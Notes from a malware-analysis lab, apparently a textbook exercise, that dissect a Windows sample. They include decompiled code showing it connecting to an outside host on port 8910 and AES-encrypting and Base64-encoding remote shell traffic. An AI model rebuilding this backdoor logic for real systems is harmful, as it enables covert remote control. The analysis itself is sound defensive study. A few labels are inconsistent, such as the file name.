Lab13-02.exe
    PE Analysis
        # Virustotal
            23/72
            SHA-256: 86054002565c929215b82615477652d24379b9119bc33ef7f41706ee7e125379

            PEiD packer
                Microsoft Visual C++

            TimeStamp: Armadillo v1.71

            Subsystem: Windows CUI
            
            Sections
                Name	Virtual Address	Virtual Size	Raw Size	Entropy	MD5
                .text	4096	44638	45056	6.5	6804db0b673791dc0e5c4fd35f230a42
                .rdata	49152	21710	24576	6.36	f1905e60a2516fd1e1fcf6b565ed84fe
                .data	73728	11624	4096	3.61	8272d79127e297c580fc854e5fce353e

            IMPORT
                KERNEL32.dll
                    GetLastError
                    HeapFree
                    GetStdHandle
                    LCMapStringW
                    SetHandleCount
                    lstrlenA
                    WaitForSingleObject
                    GetOEMCP
                    LCMapStringA
                    HeapDestroy
                    ExitProcess
                    IsBadWritePtr
                    GetEnvironmentStringsW
                    FlushFileBuffers
                    LoadLibraryA
                    RtlUnwind
                    GetModuleFileNameA
                    GetACP
                    FreeEnvironmentStringsA
                    CreatePipe
                    GetCurrentProcess
                    GetEnvironmentStrings
                    WideCharToMultiByte
                    UnhandledExceptionFilter
                    MultiByteToWideChar
                    HeapSize
                    FreeEnvironmentStringsW
                    GetCPInfo
                    GetCommandLineA
                    GetProcAddress
                    GetFileType
                    SetStdHandle
                    RaiseException
                    CreateThread
                    GetStringTypeA
                    SetFilePointer
                    ReadFile
                    SetUnhandledExceptionFilter
                    WriteFile
                    GetStartupInfoA
                    CloseHandle
                    DuplicateHandle
                    HeapReAlloc
                    GetStringTypeW
                    LocalFree
                    TerminateProcess
                    CreateProcessA
                    WriteConsoleA
                    HeapCreate
                    VirtualFree
                    FormatMessageA
                    IsBadCodePtr
                    HeapAlloc
                    GetVersion
                    IsBadReadPtr
                    VirtualAlloc
                USER32.dll
                    wsprintfA
                WS2_32.dll
                    WSAStartup
                    gethostbyname
                    htons
                    WSASocketA
                    connect

        # strings.exe (Only part of the results)
            CDEFGHIJKLMNOPQRSTUVWXYZABcdefghijklmnopqrstuvwxyzab0123456789+/
            ijklmnopqrstuvwx
            www.practicalmalwareanalysis.com
            L"A
            d"A
            Object not Initialized
            Data not multiple of Block Size
            Empty key
            Incorrect key length
            Incorrect block length
            .?AVexception@@
            .?AVios_base@std@@
            .?AV?$basic_ios@DU?$char_traits@D@std@@@std@@
            .?AV?$basic_istream@DU?$char_traits@D@std@@@std@@
            .?AV?$basic_ostream@DU?$char_traits@D@std@@@std@@
            .?AV?$basic_streambuf@DU?$char_traits@D@std@@@std@@
            .?AV?$basic_filebuf@DU?$char_traits@D@std@@@std@@
            .?AV?$basic_ios@GU?$char_traits@G@std@@@std@@
            .?AV?$basic_istream@GU?$char_traits@G@std@@@std@@
            .?AV?$basic_ostream@GU?$char_traits@G@std@@@std@@
            .?AV?$basic_filebuf@GU?$char_traits@G@std@@@std@@
            .?AV?$basic_streambuf@GU?$char_traits@G@std@@@std@@
            .?AVruntime_error@std@@
            .?AVfailure@ios_base@std@@
            .?AVfacet@locale@std@@
            .?AV_Locimp@locale@std@@
            .?AVlogic_error@std@@
            .?AVlength_error@std@@
            .?AVout_of_range@std@@
            .?AVtype_info@@

        # PEid KANAL
            RIJNDAEL [S] [char] :: 0000C908 :: 0040C908             // AES
                Referenced at 00401E95
                Referenced at 00401EB0
                Referenced at 00401ECB
                Referenced at 00401EE9
                Referenced at 00402002
                Referenced at 0040201B
                Referenced at 00402039
                Referenced at 00402057
                Referenced at 004025F1
                Referenced at 00402610
                Referenced at 00402631
                Referenced at 0040264F
                Referenced at 00402674
                Referenced at 00402695
                Referenced at 004026B5
                Referenced at 004026D3
                Referenced at 004026F7
                Referenced at 00402718
                Referenced at 00402739
                Referenced at 00402756
                Referenced at 0040277B
                Referenced at 0040279B
                Referenced at 004027BC
                Referenced at 004027DA
                Referenced at 0040308F
                Referenced at 004030CC
                Referenced at 00403109
                Referenced at 00403143
            RIJNDAEL [S-inv] [char] :: 0000CA08 :: 0040CA08
                Referenced at 00402BAC
                Referenced at 00402BCB
                Referenced at 00402BEC
                Referenced at 00402C0A
                Referenced at 00402C2F
                Referenced at 00402C50
                Referenced at 00402C70
                Referenced at 00402C8E
                Referenced at 00402CB2
                Referenced at 00402CD3
                Referenced at 00402CF4
                Referenced at 00402D11
                Referenced at 00402D36
                Referenced at 00402D56
                Referenced at 00402D77
                Referenced at 00402D95
                Referenced at 00403456
                Referenced at 00403493
                Referenced at 004034D0
                Referenced at 0040350A

    Dynamic Analysis
        # RegShot (Part of results)
            Nothing valuable

        # procexp (View > Lower Pane View > DLLS / Handles)
            NULL

        # procmon
            Nothing valuable

        # autoruns
            NULL

        # ApateDNS
            www.practicalmalwareanalysis.com (Only DNS query)
        
        # Netcat
            C:\Documents and Settings\practice\Desktop>Lab13-03.exe
            ERROR: API    = ReadConsole.
            error code = 0.
            message    = The operation completed successfully.
            .

            $ sudo nc -lvvp 8910
            [sudo] password for osboxes: 
            Listening on [0.0.0.0] (family 0, port 8910)
            Connection from [10.0.0.2] port 8910 [tcp/*] accepted (family 2, sport 1175)

        # sc
            NULL

        # IDA Pro & OllyDbg
            Analyze main()
                int __cdecl main(int argc, const char **argv, const char **envp)
                {
                s_xor1(&unk_412EF8, aIjklmnopqrstuv, &unk_413374, 16, 16);
                v7 = WSAStartup(0x202u, &WSAData);
                if ( v7 )
                    return 1;
                s = WSASocketA(2, 1, 6, 0, 0, 0);
                if ( s == -1 )
                    return 1;
                v6 = gethostbyname(::name);                                         // www.practicalmalwareanalysis.com
                if ( !v6 )
                    return 1;
                *&name.sa_data[2] = **v6->h_addr_list;
                *name.sa_data = htons(8910u);                                       // port:8910
                name.sa_family = 2;
                v7 = connect(s, &name, 16);
                if ( v7 == -1 )
                    return 1;
                sub_4015B7(*&name.sa_family, *&name.sa_data[2], *&name.sa_data[6], *&name.sa_data[10], s);
                return 0;
                }

            search xor and use findcrypt to automatic recognize
                00401AC2        s_xor1
                0040223A        s_xor2
                004027ED        s_xor3
                00402DA8        s_xor4
                00403166        s_xor5
                00403990        s_xor6

                Analyze the relationship between the above functions.
                main > s_xor1
                s_xor4 > s_xor2         .rdata:0040CF08 Rijndael_Te1    dd 0A5C66363h       encrption
                s_xor5 > s_xor3         .rdata:0040DF08 Rijndael_Td1    dd 5051F4A7h        decryption
                
                sub40352D > s_xor4, s_xor6      // s_aes_encrypt

                s_xor1
                .text:00401AD2                 mov     [ebp+var_3C], offset aEmptyKey ; "Empty key"                                                   // Maybe key initialization
                .text:00401B05                 mov     [ebp+var_4C], offset aIncorrectKeyLe ; "Incorrect key length"
                .text:00401B38                 mov     [ebp+var_5C], offset aIncorrectBlock ; "Incorrect block length"
                
                if ( !a2 )                      // a2 is key <- check in main() call
                {
                    v13 = aEmptyKey;
                
                .text:0040188B                 push    offset aIjklmnopqrstuv ; "ijklmnopqrstuvwx"                                      // AES key
                .text:00401890                 mov     ecx, offset unk_412EF8
                .text:00401895                 call    s_xor1

            s_xor1(&unk_412EF8, aIjklmnopqrstuv, &unk_413374, 16, 16);
                Ctrl+X on &unk_412EF8
                    s_aes_encrypt(&unk_412EF8, &Buffer, &v2, nNumberOfBytesToWrite, 1);             // sub_40132B
                    DWORD __stdcall sub_40132B(LPVOID lpThreadParameter)
                    {
                    Buffer = 0;
                    memset(&v7, 0, 0x400u);
                    v2 = 0;
                    memset(&v3, 0, 0x400u);
                    v10 = 0;
                    memset(&v11, 0, 0x7CCu);
                    v12 = 0;
                    v13 = 0;
                    v5 = lpThreadParameter;
                    while ( ReadFile(*v5, &Buffer, 0x400u, &NumberOfBytesRead, 0) && NumberOfBytesRead )                            // Read
                    {
                        *(&Buffer + NumberOfBytesRead) = 0;
                        nNumberOfBytesToWrite = sub_4012E9(NumberOfBytesRead);
                        v8 = 0;
                        memset(&v2, 0, 0x401u);
                        s_aes_encrypt(&unk_412EF8, &Buffer, &v2, nNumberOfBytesToWrite, 1);                                         // Encrypt
                        if ( !WriteFile(v5[1], &v2, nNumberOfBytesToWrite, &NumberOfBytesWritten, 0) )                              // WriteFile
                        sub_401256(aWriteconsole);
                    }
                    if ( GetLastError() != 109 )
                        sub_401256(aReadfile);
                    return 1;
                    }

                &unk_413374
                    Nothing
            
            Analyze Base64
                .text:0040103F sub_40103F      proc near               ; CODE XREF: sub_401082+6Dâ†“p
                ...
                .text:0040105E                 movsx   edx, byte_4120A4[ecx] ; DEFGHIJKLMNOPQRSTUVWXYZABcdefghijklmnopqrstuvwxyzab0123456789+/          // Maybe Base64

                DWORD __stdcall StartAddress(LPVOID lpThreadParameter)
                {
                v8 = lpThreadParameter;
                v5 = 0;
                v10 = 0;
                memset(&v11, 0, 0x400u);
                v6 = 0;
                memset(&v7, 0, 0x400u);
                do
                {
                    if ( !ReadFile(*v8, Buffer, 0x400u, &NumberOfBytesRead, 0) || !NumberOfBytesRead )      // Read
                    sub_401256(aReadconsole);
                    Buffer[NumberOfBytesRead] = 0;
                    memset(&v6, 0, 0x401u);
                    v1 = strlen(Buffer);
                    sub_401082(v1, Buffer, 0x401u, &v6);                                                    // Base64? <- decode?
                    v2 = strlen(&v6);
                }
                while ( WriteFile(v8[1], &v6, v2, &NumberOfBytesWritten, 0) );                              // Write
                if ( GetLastError() != 232 )
                    sub_401256(aWritefile);
                return 1;
                }
            
            main > sub_4015B7 > CreateThread(0, 0, sub_40132B(s_aes_encrypt), ..)                           // v34 = CreateThread(0, 0, sub_40132B, &v22, 0, &v29);
                              > CreateThread(0, 0, StartAddress, ..) > sub_40182 > sub_40103F(Base64)       // v37 = CreateThread(0, 0, StartAddress, &Parameter, 0, &ThreadId);

            DWORD __stdcall sub_40132B(LPVOID lpThreadParameter)
            {
            while ( ReadFile(*lpThreadParameter, &Buffer, 0x400u, &NumberOfBytesRead, 0) && NumberOfBytesRead )     // Read
            {
                *(&Buffer + NumberOfBytesRead) = 0;
                nNumberOfBytesToWrite = sub_4012E9(NumberOfBytesRead);
                v8 = 0;
                memset(&v2, 0, 0x401u);
                s_aes_encrypt(&unk_412EF8, &Buffer, &v2, nNumberOfBytesToWrite, 1);
                if ( !WriteFile(lpThreadParameter[1], &v2, nNumberOfBytesToWrite, &NumberOfBytesWritten, 0) )       // Write
                sub_401256(aWriteconsole);
            }
            if ( GetLastError() != 109 )
                sub_401256(aReadfile);
            return 1;
            }
    